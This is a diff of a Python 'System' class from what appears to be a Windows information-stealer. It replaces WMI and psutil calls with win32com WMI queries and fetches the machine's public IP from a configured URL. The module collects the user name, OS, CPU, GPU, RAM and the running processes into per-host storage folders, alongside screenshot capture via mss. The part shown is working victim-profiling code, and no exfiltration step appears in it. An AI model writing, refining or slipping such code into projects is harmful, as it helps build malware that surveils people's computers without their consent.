@@ -1,9 +1,7 @@
-from wmi import WMI
 from mss import mss
 from os import mkdir
-from psutil import process_iter
-from datetime import datetime
-from socket import gethostbyname, gethostname
+from urllib3 import poolmanager
+from win32com.client import GetObject
 
 from ..utils.config import SystemConfig
 
@@ -33,19 +31,20 @@ class System:
 
         if self.statuses[1] is True:
 
-            computer = WMI()
+            win_object = GetObject("winmgmts:root\\cimv2")
 
-            os_info = computer.Win32_OperatingSystem()[0]
-            cpu_info = computer.Win32_Processor()[0]
-            gpu_info = computer.Win32_VideoController()[0]
+            os_info = win_object.ExecQuery("Select * from Win32_OperatingSystem")[0]
+            net_info = poolmanager.PoolManager().request(method="GET", url=self.config.IPUrl).data.decode("utf-8")
+            cpu_info = win_object.ExecQuery("Select * from Win32_Processor")[0].Name
+            gpu_info = win_object.ExecQuery("Select * from Win32_VideoController")[0].Name
 
             info = (
                 f"User: {self.config.User}\n",
-                f"IP: {gethostbyname(gethostname())}\n",
+                f"IP: {net_info}\n",
                 f"OS Name: {os_info.Name.split('|')[0]}\n",
                 f"OS Version: {' '.join([os_info.Version, os_info.BuildNumber])}\n",
-                f"CPU: {cpu_info.Name}\n",
-                f"GPU: {gpu_info.Name}\n",
+                f"CPU: {cpu_info}\n",
+                f"GPU: {gpu_info}\n",
                 f"RAM: {round(float(os_info.TotalVisibleMemorySize) / 1048576)} GB\n"
             )
 
@@ -62,10 +61,8 @@ class System:
 
             with open(rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Processes.txt", "a", encoding="utf-8") as processes:
 
-                processes.write(self.config.ProcessesDescription)
-
-                for process in process_iter():
-                    processes.write(f"\n[{datetime.fromtimestamp(process.create_time())}] [{process.status()}] [{process.cpu_percent()}] [{process.memory_percent():.4f}] {process.name()}")
+                result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
+                processes.write("\n".join(process for process in result))
 
             processes.close()
 
